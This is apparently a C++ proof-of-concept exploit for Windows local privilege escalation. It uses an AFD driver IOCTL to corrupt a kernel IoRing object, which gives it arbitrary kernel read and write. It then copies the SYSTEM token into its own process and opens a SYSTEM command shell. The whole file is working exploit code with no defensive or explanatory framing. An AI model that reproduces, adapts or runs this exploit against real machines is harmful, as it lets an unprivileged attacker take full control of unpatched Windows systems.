#include "types.hpp"

#include <iostream>
#include <ioringapi.h>
#include <ntstatus.h>

#define AFD_NOTIFYSOCK_IOCTL 0x12127

typedef struct AFD_NOTIFYSOCK_DATA
{
    HANDLE hCompletion; // +0x0
    PVOID pData1;       // +0x8
    PVOID pData2;       // +0x10
    PVOID pPwnPtr;      // +0x18
    DWORD dwCounter;    // +0x20
    DWORD dwTimeout;    // +0x24 
    DWORD dwLen;        // +0x28
    CHAR padding[0x4];  // +0x2c
}AFD_NOTIFYSOCK_DATA;

PNtCreateFile _NtCreateFile = (PNtCreateFile)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateFile");
PNtDeviceIoControlFile _NtDeviceIoControlFile = (PNtDeviceIoControlFile)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDeviceIoControlFile");
PNtCreateIoCompletion _NtCreateIoCompletion = (PNtCreateIoCompletion)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateIoCompletion");
PNtSetIoCompletion _NtSetIoCompletion = (PNtSetIoCompletion)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetIoCompletion");
PNtQuerySystemInformation _NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

HIORING hIoRing;
PIPE_HANDLES arbWritePipe, arbReadPipe;

int GetObjectAddressByPidAndHandle(PULONG64 pObjAddr, ULONG ulPid, HANDLE handle)
{
    int ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS ntStatus = STATUS_SUCCESS;

    while ((ntStatus = _NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (pHandleInfo != NULL)
        {
            pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        }
        else
        {
            pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (ntStatus != STATUS_SUCCESS)
    {
        ret = ntStatus;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == (USHORT)handle))
        {
            *pObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
            ret = 0;
            break;
        }
    }

done:
    if (NULL != pHandleInfo)
    {
        HeapFree(GetProcessHeap, 0, pHandleInfo);
    }
    return ret;
}

LONG PrepareIoRing()
{
    LONG ret = -1;
    IORING_CREATE_FLAGS ioRingFlags = { 0 };

    ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    ioRingFlags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

    ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);
    if (ret != S_OK)
    {
        wprintf(L"[-] Error CreateIoRing\r\n");
        return ret;
    }

    CreatePipe(&arbReadPipe.r, &arbReadPipe.w, NULL, 0x1000);
    if (INVALID_HANDLE_VALUE == arbReadPipe.r || INVALID_HANDLE_VALUE == arbReadPipe.w)
    {
        wprintf(L"[-] Error CreatePipe\r\n");
        return ret;
    }
    CreatePipe(&arbWritePipe.r, &arbWritePipe.w, NULL, 0x1000);
    if (INVALID_HANDLE_VALUE == arbWritePipe.r || INVALID_HANDLE_VALUE == arbWritePipe.w)
    {
        wprintf(L"[-] Error CreatePipe\r\n");
        return ret;
    }
    return 0;
}

// Address -> pipe
LONG IoRingRead(PULONG64 pRegisteredBuffers, PVOID pReadAddress, PVOID pReadBuffer, ULONG ulReadLength)
{
    LONG ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF fileRef = IoRingHandleRefFromHandle(arbReadPipe.w);
    IORING_BUFFER_REF dataRef = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        wprintf(L"[-] Error VirtualAlloc\r\n");
        goto done;
    }


    pMcBufferEntry->Address = pReadAddress;
    pMcBufferEntry->Length = ulReadLength;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;
    pRegisteredBuffers[0] = (ULONG64)pMcBufferEntry;

    ret = BuildIoRingWriteFile(hIoRing, fileRef, dataRef, ulReadLength, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
    if (S_OK != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);
    if (S_OK != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);
    if (S_OK != ret)
    {
        goto done;
    }

    if (S_OK != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    if (0 == ReadFile(arbReadPipe.r, pReadBuffer, ulReadLength, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    wprintf(L"[+] IoRingRead\r\n");
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}



// file -> dataref
// pipe -> regbuffers
LONG IoRingWrite(PULONG64 pRegisterBuffers, PVOID pWriteAddress, PVOID pWriteBuffer, ULONG ulWriteLength)
{
    LONG ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF fileRef = IoRingHandleRefFromHandle(arbWritePipe.r);
    IORING_BUFFER_REF dataRef = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };
    if (0 == WriteFile(arbWritePipe.w, pWriteBuffer, ulWriteLength, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }
    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pWriteAddress;
    pMcBufferEntry->Length = ulWriteLength;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = (ULONG64)pMcBufferEntry;

    ret = BuildIoRingReadFile(hIoRing, fileRef, dataRef, ulWriteLength, 0, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    wprintf(L"[+] IoRingWrite\r\n");
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

static VOID SpawnShell()
{

    wprintf(L"[+] Spawning nt authority/system shell...\r\n");

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));

    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}

LONG ArbitraryKernelWrite0x1(PVOID pPwnPtr)
{
    LONG ret = -1;
    HANDLE hCompletion = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    HANDLE hSocket = INVALID_HANDLE_VALUE;
    UNICODE_STRING ObjectFilePath = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    AFD_NOTIFYSOCK_DATA Data = { 0 };
    HANDLE hEvent = NULL;
    HANDLE hThread = NULL;

    // Hard-coded attributes for an IPv4 TCP socket
    BYTE bExtendedAttributes[] =
    {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
        0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
    };

    ret = _NtCreateIoCompletion(&hCompletion, MAXIMUM_ALLOWED, NULL, 1);

    if (0 != ret)
    {
        goto done;
    }

    ret = _NtSetIoCompletion(hCompletion, 0x1337, &IoStatusBlock, 0, 0x100);

    if (0 != ret)
    {
        goto done;
    }

    ObjectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
    ObjectFilePath.Length = (USHORT)wcslen(ObjectFilePath.Buffer) * sizeof(WCHAR);
    ObjectFilePath.MaximumLength = ObjectFilePath.Length;

    ObjectAttributes.Length = sizeof(ObjectAttributes);
    ObjectAttributes.ObjectName = &ObjectFilePath;
    ObjectAttributes.Attributes = 0x40;

    ret = _NtCreateFile(
        &hSocket, 
        MAXIMUM_ALLOWED, 
        &ObjectAttributes,
        &IoStatusBlock, 
        NULL, 
        0, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        1, 
        0, 
        bExtendedAttributes, 
        sizeof(bExtendedAttributes)
    );

    if (0 != ret)
    {
        goto done;
    }

    Data.hCompletion = hCompletion;
    Data.pData1 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    Data.pData2 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    Data.dwCounter = 0x1;
    Data.dwLen = 0x1;
    Data.dwTimeout = 100000000;
    Data.pPwnPtr = pPwnPtr;

    if ((NULL == Data.pData1) || (NULL == Data.pData2))
    {
        ret = GetLastError();
        goto done;
    }

    hEvent = CreateEvent(NULL, 0, 0, NULL);

    if (NULL == hEvent)
    {
        ret = GetLastError();
        goto done;
    }

    _NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &IoStatusBlock, AFD_NOTIFYSOCK_IOCTL, &Data, 0x30, NULL, 0);

    ret = 0;

done:
    if (INVALID_HANDLE_VALUE != hCompletion)
    {
        CloseHandle(hCompletion);
    }

    if (INVALID_HANDLE_VALUE != hSocket)
    {
        CloseHandle(hSocket);
    }

    if (NULL != hEvent)
    {
        CloseHandle(hEvent);
    }

    if (NULL != Data.pData1)
    {
        VirtualFree(Data.pData1, 0, MEM_RELEASE);
    }

    if (NULL != Data.pData2)
    {
        VirtualFree(Data.pData2, 0, MEM_RELEASE);
    }

    return ret;
}


int main()
{
    if ((_NtSetIoCompletion == NULL)
        || (_NtCreateIoCompletion == NULL)
        || (_NtCreateFile == NULL)
        || (_NtDeviceIoControlFile == NULL)
        || (_NtQuerySystemInformation == NULL))
    {
        wprintf(L"[-] Error Prepare function\r\n");
        return EXIT_FAILURE;
    }
    LPVOID pFakeRegisterBuffer = VirtualAlloc((LPVOID)0x1000000, sizeof(LPVOID) * 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    PrepareIoRing();
    
    ULONG64 ulIoRingObject;
    GetObjectAddressByPidAndHandle(&ulIoRingObject, GetCurrentProcessId(), *(PHANDLE)hIoRing);

    PIORING_OBJECT pIoRing = (PIORING_OBJECT)ulIoRingObject;
    // _IORING_OBJECT RegisterBuffers
    ArbitraryKernelWrite0x1((char *)&pIoRing->RegBuffers + 0x3);
    // _IORING_OBJECT RegisterBuffersCount
    ArbitraryKernelWrite0x1((char*)&pIoRing->RegBuffersCount);

    wprintf(L"[*] IORing Object: %#llx\r\n", ulIoRingObject);
    /*
        0: kd> dt nt!_IORING_OBJECT 0xffff9485b62f6750
       +0x000 Type             : 0n14
       +0x002 Size             : 0n208
       +0x008 UserInfo         : _NT_IORING_INFO
       +0x038 Section          : 0xffffc406`59c6c450 Void
       +0x040 SubmissionQueue  : 0xfffff800`43400000 _NT_IORING_SUBMISSION_QUEUE
       +0x048 CompletionQueueMdl : 0xffff9485`b6918000 _MDL
       +0x050 CompletionQueue  : 0xffff917b`d5200050 _NT_IORING_COMPLETION_QUEUE
       +0x058 ViewSize         : 0x701000
       +0x060 InSubmit         : 0n0
       +0x068 CompletionLock   : 0
       +0x070 SubmitCount      : 0
       +0x078 CompletionCount  : 0
       +0x080 CompletionWaitUntil : 0
       +0x088 CompletionEvent  : _KEVENT
       +0x0a0 SignalCompletionEvent : 0 ''
       +0x0a8 CompletionUserEvent : (null) 
       +0x0b0 RegBuffersCount  : 1
       +0x0b8 RegBuffers       : 0x00000000`01000000  -> ???? 
       +0x0c0 RegFilesCount    : 0
       +0x0c8 RegFiles         : (null) 
    */
    ULONG64 token;
    ULONG64 systemEprocess;
    GetObjectAddressByPidAndHandle(&systemEprocess, 4, (HANDLE)4);
    wprintf(L"[*] System eprocess: %#llx\r\n", systemEprocess);
    wprintf(L"[*] System token addr: %#llx\r\n", systemEprocess + EPROCESS_TOKEN_OFFSET);

    // 用户 和 内核一致
    _HIORING *phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegisterBuffer;
    phIoRing->BufferArraySize = 1;
    IoRingRead((PULONG64)pFakeRegisterBuffer, (PVOID)(systemEprocess + EPROCESS_TOKEN_OFFSET), (PVOID)&token, sizeof(token));
    wprintf(L"[*] System token: %#llx\r\n", token);

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
    ULONG64 ulTarget;
    GetObjectAddressByPidAndHandle(&ulTarget, GetCurrentProcessId(), hProc);
    wprintf(L"[*] Current process: %#llx\r\n", ulTarget);

    wprintf(L"[+] Replace token: %#llx\r\n", ulTarget);
    IoRingWrite((PULONG64)pFakeRegisterBuffer, (PVOID)(ulTarget + EPROCESS_TOKEN_OFFSET), (PVOID)&token, sizeof(token));
    SpawnShell();
    // clear
    BYTE clear[0x10] = { 0 };
    IoRingWrite((PULONG64)pFakeRegisterBuffer, (PVOID)(&pIoRing->RegBuffersCount), (PVOID)clear, 0x10);
    CloseIoRing(hIoRing);
    return EXIT_SUCCESS;
}